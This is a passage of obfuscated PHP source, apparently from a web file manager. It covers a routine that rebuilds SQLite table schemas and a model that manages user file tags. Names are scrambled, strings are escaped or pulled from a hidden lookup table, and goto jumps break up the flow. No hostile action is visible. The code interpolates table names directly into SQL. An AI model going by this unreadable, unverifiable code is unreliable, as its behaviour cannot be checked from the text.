$Ã‚Éäö = array(); $…ŞîĞ„‰ = array($íÃ‘æáÛ[1158] => $íÃ‘æáÛ[1159], $íÃ‘æáÛ[1159] => $íÃ‘æáÛ[1159], $íÃ‘æáÛ[341] => $íÃ‘æáÛ[368], $íÃ‘æáÛ[340] => $íÃ‘æáÛ[368]); foreach ($”ú·ì as $¿…µİ¨Ì) { $£İµŞ€ = array($íÃ‘æáÛ[128] . $¿…µİ¨Ì[$íÃ‘æáÛ[1160]] . $íÃ‘æáÛ[128], isset($…ŞîĞ„‰[$¿…µİ¨Ì[$íÃ‘æáÛ[1161]]]) ? $…ŞîĞ„‰[$¿…µİ¨Ì[$íÃ‘æáÛ[1161]]] : $¿…µİ¨Ì[$íÃ‘æáÛ[1162]], $¿…µİ¨Ì[$íÃ‘æáÛ[1163]] == $íÃ‘æáÛ[938] ? $íÃ‘æáÛ[1164] : $íÃ‘æáÛ[1165], $¿…µİ¨Ì[$íÃ‘æáÛ[1160]] == $…»Œ Á£ ? $íÃ‘æáÛ[1166] : $íÃ‘æáÛ[12], $¿…µİ¨Ì[$íÃ‘æáÛ[990]] ? strtoupper(str_replace($íÃ‘æáÛ[11], $íÃ‘æáÛ[12], $¿…µİ¨Ì[$íÃ‘æáÛ[990]])) : $íÃ‘æáÛ[12]); $Ã‚Éäö[] = trim(implode($íÃ‘æáÛ[63], $£İµŞ€)); } $ĞñÆ¤÷Ñ = array($íÃ‘æáÛ[1167] . $‡•æòÕÂ . $íÃ‘æáÛ[1168], $íÃ‘æáÛ[1169] . $‡•æòÕÂ . $íÃ‘æáÛ[1170], implode($íÃ‘æáÛ[60] . PHP_EOL, $Ã‚Éäö), $íÃ‘æáÛ[987]); $íå›ÕÃ• = implode(PHP_EOL, array_merge($ĞñÆ¤÷Ñ, $ØÈúÆ×´)); if ($²™áÉØ && $²™áÉØ == $íÃ‘æáÛ[23]) { return $íå›ÕÃ•; } $¾Œ»Ÿ¿ = array($íÃ‘æáÛ[844] => $£äÙë•, $íÃ‘æáÛ[23] => $íå›ÕÃ•); return $²™áÉØ ? $¾Œ»Ÿ¿[$²™áÉØ] : $¾Œ»Ÿ¿; } public function sqlFromSqlite($ïñ»Ô¾¶, $ñ×ú»²æ = '') { $ÄÎ€ŠÕ± =& $_SERVER[‚ûòÉ˜ş]; $ğÑÈ¨ƒ§ = $this->model()->db(); $ã¼¹ÅÃ‡ = "\x50\x52\101\x47\x4d\101\40\x54\101\x42\x4c\x45\137\111\x4e\x46\117\x20\50\x27{$ïñ»Ô¾¶}\x27\x29"; $½Å´œö = "\123\x45\114\x45\x43\x54\40\x2a\40\106\122\x4f\x4d\40\x73\161\x6c\x69\164\x65\x5f\155\x61\x73\x74\145\162\40\127\x48\x45\122\x45\40\164\x62\154\x5f\x6e\141\x6d\x65\40\x3d\x20\x27{$ïñ»Ô¾¶}\x27"; $× Œ¿‰ø = $ğÑÈ¨ƒ§->query($ã¼¹ÅÃ‡); if (empty($× Œ¿‰ø)) { $ÊºÛˆµº = array($ÄÎ€ŠÕ±[844] => $ÄÎ€ŠÕ±[12], $ÄÎ€ŠÕ±[23] => $ÄÎ€ŠÕ±[12]); return $ñ×ú»²æ ? $ÊºÛˆµº[$ñ×ú»²æ] : $ÊºÛˆµº; } $ÒÅ åŠ = $ğÑÈ¨ƒ§->query($½Å´œö); $Åà¢î¸… = $âµ«‚¸Ÿ = array(); foreach ($ÒÅ åŠ as $ˆáÓ‡˜ø) { if ($ˆáÓ‡˜ø[$ÄÎ€ŠÕ±[43]] == $ÄÎ€ŠÕ±[332]) { $Åà¢î¸…[] = $ˆáÓ‡˜ø[$ÄÎ€ŠÕ±[1171]]; } else { $âµ«‚¸Ÿ[$ˆáÓ‡˜ø[$ÄÎ€ŠÕ±[42]]] = $ˆáÓ‡˜ø[$ÄÎ€ŠÕ±[1171]]; } } $äĞéÄÆé = array_merge(array($ÄÎ€ŠÕ±[1167] . $ïñ»Ô¾¶ . $ÄÎ€ŠÕ±[128]), $Åà¢î¸…, array_values($âµ«‚¸Ÿ)); $äĞéÄÆé = implode($ÄÎ€ŠÕ±[81] . PHP_EOL, $äĞéÄÆé) . $ÄÎ€ŠÕ±[81]; if ($ñ×ú»²æ && $ñ×ú»²æ == $ÄÎ€ŠÕ±[23]) { return $äĞéÄÆé; } $˜÷µ“ˆ = array(); $˜¶Ø¢«• = array($ÄÎ€ŠÕ±[1159] => $ÄÎ€ŠÕ±[1172], $ÄÎ€ŠÕ±[368] => $ÄÎ€ŠÕ±[1173]); $üğ‰ìÍ = $ÄÎ€ŠÕ±[12]; foreach ($× Œ¿‰ø as $ˆáÓ‡˜ø) { if ($ˆáÓ‡˜ø[$ÄÎ€ŠÕ±[67]] == $ÄÎ€ŠÕ±[98]) { $üğ‰ìÍ = $ˆáÓ‡˜ø[$ÄÎ€ŠÕ±[42]]; } $ŸÊ¾Å§Ê = array($ÄÎ€ŠÕ±[437] . $ˆáÓ‡˜ø[$ÄÎ€ŠÕ±[42]] . $ÄÎ€ŠÕ±[437], isset($˜¶Ø¢«•[$ˆáÓ‡˜ø[$ÄÎ€ŠÕ±[43]]]) ? $˜¶Ø¢«•[$ˆáÓ‡˜ø[$ÄÎ€ŠÕ±[43]]] : $ˆáÓ‡˜ø[$ÄÎ€ŠÕ±[43]], $ˆáÓ‡˜ø[$ÄÎ€ŠÕ±[45]] == $ÄÎ€ŠÕ±[98] ? $ÄÎ€ŠÕ±[1164] : $ÄÎ€ŠÕ±[1174] . $ˆáÓ‡˜ø[$ÄÎ€ŠÕ±[66]], $ˆáÓ‡˜ø[$ÄÎ€ŠÕ±[67]] == $ÄÎ€ŠÕ±[98] ? $ÄÎ€ŠÕ±[1175] : $ÄÎ€ŠÕ±[12]); $˜÷µ“ˆ[] = trim(implode($ÄÎ€ŠÕ±[63], $ŸÊ¾Å§Ê)); } foreach ($âµ«‚¸Ÿ as $ƒÀ•¼áÅ => $™çÆúˆ§) { $Ìô¦ÌöÇ = str_replace($ÄÎ€ŠÕ±[1176] . $ïñ»Ô¾¶ . $ÄÎ€ŠÕ±[11], $ÄÎ€ŠÕ±[12], $ƒÀ•¼áÅ); $™¦ú¿»ô = str_replace(array($ÄÎ€ŠÕ±[128], $ÄÎ€ŠÕ±[998]), $ÄÎ€ŠÕ±[437], substr($™çÆúˆ§, stripos($™çÆúˆ§, $ÄÎ€ŠÕ±[313]))); if ($Ìô¦ÌöÇ == $ÄÎ€ŠÕ±[1153]) { $ÀÂóÍ‚ı = $ÄÎ€ŠÕ±[1177] . $üğ‰ìÍ . $ÄÎ€ŠÕ±[1178]; } else { $ÀÂóÍ‚ı = (stripos($Ìô¦ÌöÇ, $ÄÎ€ŠÕ±[11]) ? $ÄÎ€ŠÕ±[1179] : $ÄÎ€ŠÕ±[12]) . ($ÄÎ€ŠÕ±[1180] . $Ìô¦ÌöÇ . $ÄÎ€ŠÕ±[1181] . $™¦ú¿»ô); } $˜÷µ“ˆ[] = $ÀÂóÍ‚ı; } $Ü“Æ“ğ¥ = array($ÄÎ€ŠÕ±[1182] . $ïñ»Ô¾¶ . $ÄÎ€ŠÕ±[1183], $ÄÎ€ŠÕ±[1184] . $ïñ»Ô¾¶ . $ÄÎ€ŠÕ±[1185], implode($ÄÎ€ŠÕ±[60] . PHP_EOL, $˜÷µ“ˆ), $ÄÎ€ŠÕ±[1186]); $Ÿ—ú = implode(PHP_EOL, $Ü“Æ“ğ¥); if ($ñ×ú»²æ && $ñ×ú»²æ == $ÄÎ€ŠÕ±[844]) { return $Ÿ—ú; } $ÊºÛˆµº = array($ÄÎ€ŠÕ±[844] => $Ÿ—ú, $ÄÎ€ŠÕ±[23] => $äĞéÄÆé); return $ñ×ú»²æ ? $ÊºÛˆµº[$ñ×ú»²æ] : $ÊºÛˆµº; } } goto d’Øâ‡‹´ã; e°ÁÒÊØŸİ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\x66\x61\x76"; protected function cacheFunctionAlias($õ—ĞÕé¾) { $‘éòï”µ =& $_SERVER[‚ûòÉ˜ş]; return array($‘éòï”µ[1996] => array($‘éòï”µ[2385] . USER_ID, $‘éòï”µ[1997])); } protected function listData() { $ÅÌŒ§ìµ =& $_SERVER[‚ûòÉ˜ş]; $ ºÂÌŸÛ = array($ÅÌŒ§ìµ[1678] => USER_ID, $ÅÌŒ§ìµ[533] => array($ÅÌŒ§ìµ[2000], 0)); $µá´•Áó = $ÅÌŒ§ìµ[2386]; $­ûÂ¾ãü = $this->field($µá´•Áó)->where($ ºÂÌŸÛ)->order($ÅÌŒ§ìµ[2003])->select(); return $­ûÂ¾ãü ? $­ûÂ¾ãü : array(); } protected function addToTag($›¶Á½, $Àøæ ó¨) { $¤šùæ¢ =& $_SERVER[‚ûòÉ˜ş]; if (!Model($¤šùæ¢[2145])->listData($Àøæ ó¨)) { return !1; } if (is_numeric($›¶Á½)) { $ƒ¾‚·© = Model($¤šùæ¢[865])->pathInfo($›¶Á½); if (!$ƒ¾‚·©) { return !1; } } else { $ƒ¾‚·© = IO::infoSimple($›¶Á½); if (!$ƒ¾‚·©) { return !1; } $î°ÃÚ” = $ƒ¾‚·©[$¤šùæ¢[42]]; $ğ¯ßÇ¾¬ = $ƒ¾‚·©[$¤šùæ¢[43]]; if (isset($ƒ¾‚·©[$¤šùæ¢[461]])) { $ğ¯ßÇ¾¬ = $ƒ¾‚·©[$¤šùæ¢[461]] == $¤šùæ¢[98] ? $¤šùæ¢[85] : $¤šùæ¢[224]; } } $Š¤úìŸ¥ = array($¤šùæ¢[1678] => USER_ID, $¤šùæ¢[533] => $Àøæ ó¨, $¤šùæ¢[471] => $›¶Á½, $¤šùæ¢[472] => $ğ¯ßÇ¾¬ ? $ğ¯ßÇ¾¬ : $¤šùæ¢[466], $¤šùæ¢[470] => $î°ÃÚ” ? $î°ÃÚ” : $¤šùæ¢[12], $¤šùæ¢[1889] => 0); if ($this->where($Š¤úìŸ¥)->find()) { return !1; } return $this->add($Š¤úìŸ¥); } protected function removeFromTag($áÄ’ù›´, $òŞÂğÄõ) { $ª™¯òÒ­ =& $_SERVER[‚ûòÉ˜ş]; if (!Model($ª™¯òÒ­[2145])->listData($òŞÂğÄõ)) { return !1; } if (is_array($áÄ’ù›´)) { $áÄ’ù›´ = array($ª™¯òÒ­[7], $áÄ’ù›´); } $íøÉ¬íã = array($ª™¯òÒ­[1678] => USER_ID, $ª™¯òÒ­[533] => $òŞÂğÄõ, $ª™¯òÒ­[471] => $áÄ’ù›´); return $this->where($íøÉ¬íã)->delete(); } protected function removeByTag($õˆöÁ—Æ) { $„òÓä»ƒ =& $_SERVER[‚ûòÉ˜ş]; if (!$õˆöÁ—Æ) { return !1; } $áâ¥äËó = array($„òÓä»ƒ[1678] => USER_ID, $„òÓä»ƒ[533] => $õˆöÁ—Æ); return $this->where($áâ¥äËó)->delete(); } protected function removeBySource($„›‡‰È) { $Ğ•¬ÉŸ =& $_SERVER[‚ûòÉ˜ş]; if (is_array($„›‡‰È)) { $„›‡‰È = array($Ğ•¬ÉŸ[7], $„›‡‰È); } $Ñöã“¹‰ = array($Ğ•¬ÉŸ[1678] => USER_ID, $Ğ•¬ÉŸ[533] => array($Ğ•¬ÉŸ[1055], 0), $Ğ•¬ÉŸ[471] => $„›‡‰È); return $this->where($Ñöã“¹‰)->delete(); } }